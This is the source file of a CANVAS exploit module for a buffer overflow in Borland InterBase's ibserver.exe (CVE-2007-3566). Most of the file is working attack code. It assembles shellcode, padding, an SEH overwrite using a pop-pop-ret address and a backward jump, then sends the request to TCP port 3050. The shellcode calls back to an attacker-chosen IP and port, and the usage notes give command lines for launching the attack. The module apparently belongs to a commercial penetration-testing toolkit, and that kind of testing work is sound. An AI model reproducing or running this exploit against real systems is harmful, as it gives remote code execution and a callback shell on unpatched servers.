#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import struct
import canvasengine

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='Borland Interbase Buffer Overflow'
DESCRIPTION='Borland Interbase ibserver.exe Create-Request Buffer Overflow Vulnerability'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Borland"
DOCUMENTATION['Date public']='07/20/07'
DOCUMENTATION['References']='http://dvlabs.tippingpoint.com/advisory/TPTI-07-13'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-3566'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3566'
DOCUMENTATION['CVSS'] = 7.5

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']

NAME=DESCRIPTION

NOTES="""
Only tested against Borland InterBase WI-V7.5.1.80 Trial version.
More to come shortly, as soon as I put my hands on them.

Usage:
./exploits/borland_ib/borland_ib.py -v 1 -t 10.10.13.20 -l 10.10.13.1 -d 5555
./commandlineInterface.py -v 1 -p 5555
"""

CHANGELOG="""
"""

targets = {
    0:['Autodetect (N/A)',0],
    1:['Borland InterBase WI-V7.5.1.80 on Windows',0x10001033] #pop&pop&ret in libborland_lm.dll
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=3050
        self.badstring='\0'
        #self.listenerArgsDict['fromcreatethread']=1
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        self.log('Creating Win32 shellcode (Callback: %s:%d)'%(self.callback.ip,self.callback.port))
        self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return

    def test(self):
        self.getArgs()
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s'%(self.port))
            return 0
        s.close()
        return 1

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.test()
        if self.version==0:
            self.log('Autoversioning not available')
            return 0
        self.info,self.eip=targets[self.version]

        self.setProgress(25)
        data=''
        data+=self.shellcode
        data+='A'*(0xfa4-0x764-len(data))
        data+='\xeb\x06' #short jmp forward
        data+='BB'
        data+=struct.pack('<L',self.eip) #SEH
        data+=mosdef.assemble('jmp $-%d'%(len(data)+5),'x86') #jmp backward
        data+='C'*(0x1000-len(data)) #enough data to trigger access violation
        request=''
        request+=struct.pack('>LLL',0x14,1,len(data))
        request+=data
        padding='D'*4
        request+=struct.pack('>L',len(padding)) #second part of the request
        request+=padding

        self.setProgress(50)
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0

        self.setProgress(75)
        self.websend(s,request)
        time.sleep(2)

        self.setProgress(100)
        if self.ISucceeded():
            return 1
        s.close()

        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
